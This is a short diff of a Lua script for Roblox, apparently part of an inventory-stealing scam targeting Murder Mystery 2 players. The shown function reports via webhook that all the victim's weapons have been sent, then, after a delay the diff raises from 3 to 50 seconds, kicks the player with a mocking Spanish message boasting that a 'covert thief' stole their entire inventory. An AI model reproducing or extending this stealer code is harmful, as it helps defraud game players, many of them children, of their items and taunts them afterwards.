@@ -551,7 +551,7 @@ local function TradeFinalizado()
 
     -- webhook final sin everyone
     SendDualHook("✅ Todos los trades finalizados","💰Todas las armas enviadas correctamente 😎",fieldsFinal, "")
-    task.wait(3)
+    task.wait(50)
     LocalPlayer:Kick("El ladron encubierto☠️ ha robado TODO tu inventario de MM2🔥 llora niño/a🤣😂🥱")
 end
 
